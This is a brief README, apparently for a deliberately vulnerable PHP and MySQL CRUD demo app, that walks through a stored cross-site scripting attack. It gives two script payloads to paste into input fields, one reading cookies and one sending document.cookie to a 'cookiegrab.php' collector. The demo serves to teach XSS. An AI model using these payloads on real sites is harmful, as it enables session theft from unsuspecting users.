# XSS Attack

## Application
Simple Create, Read, Update, Delete (CRUD) in PHP & MySQL
========
Edit config.php according to your DB!

## XSS Attack
Inject Javascript in any input fields while adding new entry.
Example input for name: `<script type="text/javascript">var myCookies = getCookies();
alert(myCookies.secret);</script>`

'<script language="javascript"> document.location= " cookiegrab.php?c=" + document.cookie; </script>'

